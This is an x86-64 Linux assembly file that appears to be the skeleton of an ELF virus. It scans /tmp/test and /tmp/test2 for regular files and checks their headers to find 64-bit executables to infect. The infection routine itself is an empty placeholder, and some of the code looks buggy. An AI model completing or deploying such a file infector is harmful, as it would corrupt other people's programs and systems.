BITS 64

%include "defines.s"

section .rodata
    dir1: db "/tmp/test", 0
        .len: equ $ - dir1
    dir2: db "/tmp/test2", 0
        .len: equ $ - dir2

section .data
    dirent: TIMES DIRENT_MAX_SIZE db 0 ; buffer

section .text
    global _start

_start:
    push    rbp
    mov     rbp, rsp
    lea     rdi, [rel dir1]
    call    readdir
    lea     rdi, [rel dir2]
    call    readdir
    xor     rdi, rdi
    mov     eax, SYS_EXIT
    syscall

; [rsp] = fd
; [rsp + 4] = buf_len
readdir:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    mov     rsi, O_DIRECTORY | O_RDONLY
    xor     eax, eax
    add     eax, SYS_OPEN
    syscall
    mov     [rsp], eax
loop_dir:
    mov     edi, [rsp]
    lea     rsi, [rel dirent]
    mov     rdx, DIRENT_MAX_SIZE
    xor     eax, eax
    add     al, SYS_GETDENTS64
    syscall
    cmp     eax, 0
    jle     end_readdir
    mov     [rsp + 0x4], eax
    xor     r8, r8
loop_buf_dirent:
    cmp     BYTE [dirent + r8 + d_type], DT_REG
    jne     next_dirent
    lea     rdi, [dirent + r8 + d_name]
    call    infect
next_dirent:
    add     r8w, [dirent + d_reclen]
    cmp     r8w, [rsp + 4]
    jl      loop_buf_dirent
    jmp     loop_dir
end_readdir:
    mov     edi, [rsp]
    xor     eax, eax
    add     eax, SYS_CLOSE
    leave
    ret

; [rsp]         fd
; [rsp + 4]     filename
; [rsp + 0xc]   e_hdr
infect:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x50
    mov     esi, O_RDONLY
    mov     eax, SYS_OPEN
    syscall
    test    eax, eax
    js      quit_infect
    mov     [rsp + 4], rdi
    je      quit_infect
    mov     [rsp], eax
    mov     edi, [rsp]
    lea     rsi, [rsp + 0xc]
    mov     rdx, ELFHDR_SIZE
    mov     eax, SYS_READ
    syscall
    lea     rbx, [rsp + 0xc]
    lea     rax, [rbx + e_ident]
    cmp     [rax], DWORD ELF_MAGIC
    jne     close_quit_infect
    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
    jne     close_quit_infect
    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
    jne     close_quit_infect
    mov     ax, [rbx + e_type]
    cmp     ax, ET_EXEC
    je      right_type_check
    cmp     ax, ET_DYN
    jne     close_quit_infect
right_type_check:
    ; infection routine
close_quit_infect:
    mov     edi, [rsp]
    mov     eax, SYS_CLOSE
    syscall
quit_infect:
    leave
    ret

_end: